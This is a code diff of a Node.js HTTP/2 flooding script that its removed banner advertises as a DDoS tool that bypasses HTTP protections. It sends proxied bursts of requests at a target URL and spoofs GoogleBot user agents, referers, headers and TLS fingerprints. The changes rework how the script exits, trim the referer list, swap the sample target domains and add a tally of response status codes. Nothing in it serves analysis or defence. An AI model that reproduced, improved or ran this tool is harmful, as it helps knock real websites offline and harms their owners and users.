@@ -1,5 +1,5 @@
 // Code by @ThaiDuongScript  
-const { exec } = require('child_process');
+
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -68,8 +68,6 @@ editedline();
 
 const spoofed1 = ip_spoof1();
 
-
-
 const args = {
   target: process.argv[2],
   time: parseInt(process.argv[3]),
@@ -77,60 +75,22 @@ const args = {
   threads: parseInt(process.argv[5]),
   proxyFile: process.argv[6]
 };
+const KillScript = () => process.exit(1);
 
-setTimeout(() => {
-  console.log(`Hết thời gian ${args.time}s, kết thúc script...`);
-  exec('pkill -f ya.js', (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Lỗi khi pkill: ${error.message}`);
-      return;
-    }
-    if (stderr) {
-      console.error(`stderr: ${stderr}`);
-      return;
-    }
-    console.log(`pkill thành công: ${stdout}`);
-  });
-}, args.time * 1000);
-
-
+ setTimeout(KillScript, args.time * 1000);
+let statusCounts = {};
+function getFormattedTime() {
+  const now = new Date();
+  const date = `${now.getMonth() + 1}/${now.getDate()}/${now.getFullYear()}`;
+  const time = now.toLocaleTimeString('en-US', { hour12: true });
+  return `${date},${time}`;
+}
 let isFull = process.argv.includes('--skibidi');
 if (process.argv.length < 7) {
     console.clear()
-    console.log(
-          chalk.white.bold('Telegram:           ') + chalk.blue.bold('    t.me/ThaiDuongScript')
-     );
      console.log(
-          chalk.white.bold('Product:             ') + chalk.magenta.bold('   TLS v1.0')
+          chalk.italic.white(`node ${process.argv[1]} "https://thaiduongngu.com/" 120 10 10 proxy.txt`)
      );
-     console.log(
-          chalk.white.bold('Date:                   ') + chalk.bgWhite.black.bold(new Date().toLocaleString('vn'))
-     );
-   console.log(
-          chalk.white.bold('Notice:                ') + 
-chalk.cyan.bold(' Fake GoogleBot + random referer header + use legit header + bypass HTTP DDoS | pm me 5$ for open source')
-     );
-
-
-     console.log(
-          chalk.underline.white.bold('\nUsage') + chalk.reset(':')
-     );
-     console.log(
-          chalk.white(`     node ${process.argv[1]}  <target> <time> <rate> <thread> <proxy>`)
-     );
-     console.log(
-          chalk.underline.white.bold('\nExample') + chalk.reset(':')
-     );
-     console.log(
-          chalk.italic.white(`     node ${process.argv[1]} "https://iristeam.sbs/" 120 10 10 proxy.txt --skibidi`)
-     );
-     console.log(
-          chalk.underline.white.bold('\nOptions') + chalk.reset(':')
-     );
-     console.log(
-          chalk.white('    --skibidi     ') + chalk.italic.white('        ~   enable skibidi mode ')
-     );
-     
     process.exit(1);
 }
 
@@ -193,24 +153,7 @@ const control_header = ["no-cache", "max-age=0"];
 
 const refers = [
   "https://www.google.com/",
-  "https://www.facebook.com/",
-  "https://www.twitter.com/",
-  "https://www.youtube.com/",
-  "https://www.linkedin.com/",
-  "https://proxyscrape.com/",
-  "https://www.instagram.com/",
-  "https://wwww.reddit.com/",
-  "https://fivem.net/",
-  "https://www.fbi.gov/",
-  "https://nettruyenplus.com/",
-  "https://vnexpress.net/",
-  "https://zalo.me/",
-  "https://shopee.vn/",
-  "https://www.tiktok.com/",
-  "https://tuoitre.vn/",
-  "https://thanhnien.vn/",
-  "https://nettruyento.com/",
-  "https://iristeam.sbs/" + "=" + randstr(2)
+  "https://search.google.com/"
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
@@ -330,7 +273,7 @@ const rateHeaders = [
 
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
-var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))] + "search?page=" + randstr(22) + "/url=https://iristeam.sbs/login.php/" + randstr(7);
+var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))] + "search?page=" + randstr(22) + "/url=https://thaiduongngu.com/login.php/" + randstr(7);
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
@@ -456,7 +399,7 @@ const ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}.${randstra(1)
         'Connection: Keep-Alive\r\n' +
         `Host: ${url.hostname}\r\n` +
         'Sec-Fetch-Dest: document\r\n' +
-        'Sec-Fetch-Mode: navigate\r\n' +ư
+        'Sec-Fetch-Mode: navigate\r\n' +
         'Sec-Fetch-Site: none\r\n' +
         'Sec-Fetch-User: ?1\r\n' +
         'Upgrade-Insecure-Requests: 1\r\n' +
@@ -545,33 +488,45 @@ function main() {
       maxHeaderListSize: 65536,
       enablePush: false
     });
+setInterval(() => {
+	console.clear()
+  console.log(`${getFormattedTime()} ${JSON.stringify(statusCounts)}`);
+}, 1500);
 
-    client.on("connect", () => {
-      const IntervalAttack = setInterval(() => {
-        const dynHeaders = {
-          ...headers,
-          ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-        };
-        for (let i = 0; i < args.Rate; i++) {
-          const request = client.request(dynHeaders);
+client.on("connect", () => {
+  const IntervalAttack = setInterval(() => {
+    const dynHeaders = {
+      ...headers,
+      ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+    };
+    for (let i = 0; i < args.Rate; i++) {
+      const request = client.request(dynHeaders);
 
-          request.on("response", (headers) => {
- if (headers[':status'] === 403) {
+      request.on("response", (headers) => {
+        const status = headers[':status'];
+        
+        
+        statusCounts[status] = (statusCounts[status] || 0) + 1;
+
+        if (status === 403) {
           client.close();
           client.destroy();
           tlsOptions.destroy();
           delete u;
-          
-   }
-            console.log(`(${'ThaiDuong'.bold.cyan}).  |. Proxy: ${proxyAddr}.  |. Target:${args.target}. |. Status: ${headers[':status']}. |. useragent:${u}. |. se-ch-ua-platform:${ch_ua_ver}. |. referer:${Ref}. |`);
-            request.close();
-            request.destroy();
-          });
-
-          request.end();
         }
-      }, 500);
-    });
+        request.close();
+        request.destroy();
+      });
+
+      request.on("error", (err) => {
+        request.close();
+        request.destroy();
+      });
+
+      request.end();
+    }
+  }, 500);
+});
 
     client.on("close", () => {
       client.destroy();
